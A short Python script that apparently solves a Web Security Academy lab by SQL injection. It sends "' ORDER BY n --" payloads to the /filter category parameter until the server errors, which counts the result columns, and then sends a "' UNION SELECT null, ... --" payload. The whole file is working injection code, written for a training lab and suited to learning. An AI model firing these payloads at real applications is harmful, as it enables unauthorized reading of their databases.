from web_security_academy.core.logger import logger


def solve_lab(session):
    path = "/filter"
    logger.info("Determining the number of columns...")

    num_columns = 0
    i = 1
    while True:
        params = {"category": f"' ORDER BY {i} --"}
        resp = session.get_path(path, params=params)
        logger.info(f"{params} => {resp.status_code}")
        if resp.status_code == 500:
            break
        else:
            num_columns += 1
            i += 1
    logger.success(f"There are {num_columns} columns.")

    # Construct columns string
    columns = ["null"] * num_columns
    columns = ", ".join(columns)
    params = {"category": f"' UNION SELECT {columns} --"}

    logger.info(
        f'Performing SQL injection UNION attack by visiting "{path}" with the following parameters:'
    )
    logger.info(params)

    session.get_path(path, params=params)
    logger.success("SQL injection UNION attack performed.")
